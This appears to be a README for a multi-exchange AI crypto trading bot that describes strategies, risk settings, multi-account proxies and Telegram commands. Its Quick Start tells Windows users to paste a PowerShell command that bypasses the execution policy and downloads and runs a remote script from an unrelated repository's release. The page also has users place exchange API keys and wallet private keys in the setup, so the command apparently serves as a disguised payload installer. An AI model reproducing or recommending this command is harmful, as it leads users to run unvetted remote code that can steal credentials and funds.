# 🤖 AI Multi-Exchange Trading Bot

> Production-style AI trading bot for **Binance, MEXC, Hyperliquid, Bybit, OKX, KuCoin, Gate.io**, and other major exchanges — designed for multi-account execution, signal automation, portfolio rotation, and high-frequency market monitoring.

[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
[![AI](https://img.shields.io/badge/AI-Strategy%20Engine-8A2BE2?style=for-the-badge&logo=openai&logoColor=white)](#)
[![Exchanges](https://img.shields.io/badge/Exchanges-Multi--Platform-FF6B00?style=for-the-badge&logoColor=white)](#)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)

```
╔══════════════════════════════════════════════════════════════════════╗
║  AI Signal Engine     │  scans market structure across exchanges   ║
║  Strategy Router      │  selects best strategy per market regime   ║
║  Risk Control Layer   │  protects balance / size / exposure        ║
║  Multi-Account Mode   │  runs many accounts with proxies           ║
╚══════════════════════════════════════════════════════════════════════╝
```

**[📈 Binance](https://www.binance.com)** · **[⚡ MEXC](https://www.mexc.com)** · **[🟢 Hyperliquid](https://app.hyperliquid.xyz)** · **[💹 Bybit](https://www.bybit.com)**

---

## 🚀 Quick Start

If you just want to launch the bot quickly on Windows, use the installation command below first. After that, continue with the project-specific setup steps.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the setup, exchange configuration, and strategy selection below.

## 📘 Project-Specific Setup

### Requirements

- Node.js 18+ or Python 3.11+
- npm / yarn / pnpm
- One or more exchange accounts with API access
- Exchange API keys with **trade** permission enabled
- Proxy list (optional, for multi-account isolation)
- Telegram bot token (optional, for alerts)
- At least one funded exchange account

### Step 2 — Install dependencies

```bash
npm install
```

### Step 3 — Configure environment variables

```bash
cp .env.example .env
```

Edit `.env` with your credentials and settings:

```env
# Core
BOT_MODE=paper
DEFAULT_EXCHANGE=binance
BASE_CURRENCY=USDT
MAX_PARALLEL_ACCOUNTS=10

# Binance
BINANCE_API_KEY=your_binance_key
BINANCE_API_SECRET=your_binance_secret

# MEXC
MEXC_API_KEY=your_mexc_key
MEXC_API_SECRET=your_mexc_secret

# Hyperliquid
HYPERLIQUID_PRIVATE_KEY=your_private_key
HYPERLIQUID_API_WALLET=0xYourWallet

# Bybit
BYBIT_API_KEY=your_bybit_key
BYBIT_API_SECRET=your_bybit_secret

# Risk
MAX_RISK_PER_TRADE=1.5
DAILY_LOSS_LIMIT=5
MAX_OPEN_POSITIONS=8
USE_STOP_LOSS=true
USE_TAKE_PROFIT=true

# Notifications
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

### Step 4 — Build the project

```bash
npm run build
```

### Step 5 — Start the bot

```bash
npm start
```

### Step 6 — Run in paper mode first

```bash
npm run paper
```

> Always test with paper trading or low-size positions before going live.

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Overview](#-overview)
- [Supported Exchanges](#-supported-exchanges)
- [Core Features](#-core-features)
- [Strategies](#-strategies)
- [AI Decision Engine](#-ai-decision-engine)
- [Risk Management](#-risk-management)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Configuration](#-configuration)
- [Running 24/7 on a VPS](#-running-247-on-a-vps)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#-disclaimer)

---

## 🌐 Overview

This project is a **multi-exchange AI trading bot** built for traders who want to automate signal generation, trade execution, and capital allocation across several major crypto platforms.

The bot continuously scans market data from multiple exchanges, compares momentum, volatility, funding rates, order book structure, and spread conditions, then routes each account into the most suitable strategy.

It can be used for:

- fully automated trading
- semi-automated signal execution
- paper trading and strategy validation
- multi-account volume farming
- cross-exchange opportunity detection
- portfolio rotation between trending assets

---

## 🏦 Supported Exchanges

The architecture is designed to support the most popular centralized and decentralized trading venues:

- **Binance** — spot, futures, funding data, high liquidity
- **MEXC** — altcoin rotation, futures, fast listings
- **Hyperliquid** — perp trading, on-chain execution, copy-style strategies
- **Bybit** — spot + perp support, deep derivatives liquidity
- **OKX** — institutional-grade market coverage
- **KuCoin** — wide altcoin access
- **Gate.io** — long-tail market opportunities
- **Bitget** — copy-trading compatible structures
- **Additional adapters** can be added with exchange-specific modules

---

## ⚙️ Core Features

- **Multi-exchange support** with exchange-specific adapters
- **AI signal engine** for regime classification and trade filtering
- **Strategy router** that switches logic by volatility, trend, and liquidity
- **Spot + futures + perpetual support**
- **Paper mode** for safe testing
- **Multi-account execution** with optional per-account proxies
- **Telegram alerts** for entries, exits, errors, and daily summary
- **Risk controls** including max drawdown, daily stop, cooldowns, and kill switch
- **Backtest-ready architecture** for future strategy validation
- **24/7 deployable** on VPS or local machine

---

## 🧠 Strategies

Below are four built-in money-making / yield-oriented strategy styles the bot can run.

### 1) 📈 Trend Momentum Sniper

Best for strong trending markets on Binance, Bybit, MEXC, and Hyperliquid.

**How it works:**
- detects breakout structure on 5m / 15m / 1h timeframes
- confirms with volume expansion and momentum filters
- enters only when AI confidence and volatility conditions align
- trails winners and cuts weak entries early

**Profit idea:** ride fast directional moves with strict stop-loss and trailing take-profit.

**Good for:** BTC, ETH, majors, liquid mid-caps.

---

### 2) ⚖️ Funding Rate Farmer

Best for perpetual futures exchanges like Hyperliquid, Binance Futures, Bybit, and OKX.

**How it works:**
- monitors positive / negative funding extremes
- opens hedged or semi-hedged positions when funding is unusually attractive
- can pair spot vs perp or long vs short structures depending on the venue
- rebalances when basis or delta drifts too far

**Profit idea:** earn from funding payments and inefficiencies without relying only on price direction.

**Good for:** high-liquidity perp pairs with predictable funding cycles.

---

### 3) 🔁 Cross-Exchange Spread Hunter

Best for Binance, MEXC, Bybit, OKX, and Gate.io.

**How it works:**
- compares price dislocations between exchanges in real time
- identifies short-lived spread opportunities
- can open one side on exchange A and opposite side on exchange B
- exits when spread normalizes or target edge is captured

**Profit idea:** monetize temporary pricing inefficiencies across venues.

**Good for:** highly traded pairs with fast APIs and enough balance on multiple exchanges.

---

### 4) 🌊 Volatility Scalper

Best for fast intraday markets with frequent expansion / compression cycles.

**How it works:**
- tracks order book imbalance, volatility bursts, and fakeout patterns
- executes small, fast trades with tight stop-loss
- avoids low-liquidity dead zones and news-event chaos
- can run in aggressive or conservative mode

**Profit idea:** stack many small controlled wins during high-activity sessions.

**Good for:** intraday traders who want many entries with defined risk.

---

## 🤖 AI Decision Engine

The AI layer is responsible for filtering low-quality setups and classifying market conditions.

### What the AI evaluates

- trend strength
- volatility regime
- order book imbalance
- funding conditions
- liquidation pressure
- spread behavior across exchanges
- recent candle structure
- session timing (Asia / EU / US)

### What the AI decides

- whether to trade or skip
- which strategy to activate
- how aggressive sizing should be
- whether market conditions are too chaotic
- whether an open trade should be reduced, held, or closed

> The AI is not a magic box — it is a filtering and orchestration layer on top of strict trading rules.

---

## 🛡️ Risk Management

The bot is designed to protect capital before chasing returns.

### Built-in protections

- max risk per trade
- daily loss limit
- max concurrent positions
- stop-loss enforcement
- take-profit automation
- volatility kill-switch
- cooldown after losing streaks
- exchange-specific balance protection
- paper mode and dry-run mode

### Example rules

- never risk more than **1–2%** of account equity per trade
- stop trading after **3 losing trades in a row**
- disable scalping during extreme spread widening
- reduce size automatically during unstable order book conditions

---

## 👥 Multi-Account & Proxy Support

The bot can run many accounts in parallel.

### Example use cases

- separate accounts per strategy
- separate accounts per exchange
- one account for paper mode, one for live mode
- separate proxy per account for isolation
- farm-style setups with multiple small balances

### Example account structure

```json
[
  {
    "id": "binance_main",
    "exchange": "binance",
    "strategy": "trend_momentum",
    "apiKey": "your_key",
    "apiSecret": "your_secret",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "hyperliquid_funding",
    "exchange": "hyperliquid",
    "strategy": "funding_farmer",
    "privateKey": "0x...",
    "proxy": "socks5://user:pass@host:port"
  }
]
```

---

## 🔧 Configuration

Common configuration areas:

- exchange credentials
- leverage limits
- default symbols
- allowed strategies
- position sizing mode
- notification settings
- proxy routing
- API retry policy
- slippage tolerance
- execution cooldowns

---

## 🖥️ Running 24/7 on a VPS

To keep the bot online around the clock:

1. rent a VPS close to exchange infrastructure for lower latency
2. install Node.js / Python and all dependencies
3. run the bot with PM2, Docker, or systemd
4. enable auto-restart on crash
5. monitor logs and Telegram alerts daily
6. rotate API keys and proxies when needed

**Recommended stack:**
- Ubuntu VPS
- PM2 or Docker Compose
- log rotation
- UFW firewall
- Telegram error alerts

---

## 📱 Telegram Commands

Example command set:

- `/startbot` — start the bot
- `/stopbot` — emergency stop
- `/status` — show exchange balances and open positions
- `/pnl` — daily / weekly PnL snapshot
- `/pause` — pause new trades
- `/resume` — resume execution
- `/strategy` — show active strategy by account
- `/risk` — show current risk limits

---

## ⚠️ Disclaimer

This software is for **educational, research, and automation testing purposes only**. Trading crypto involves significant financial risk. Market conditions can change violently, APIs can fail, and execution quality may differ across exchanges.

Never deploy with money you cannot afford to lose.
Always test in paper mode first.
Always review API permissions, risk settings, and withdrawal restrictions before going live.

---

## 🧩 Future Expansion Ideas

- sentiment ingestion from X / Telegram / news feeds
- copy-trading module for whale wallets
- portfolio optimizer between exchanges
- liquidation heatmap integration
- AI trade journaling and post-trade analysis
- built-in backtester and walk-forward analysis
- web dashboard with PnL and signal history
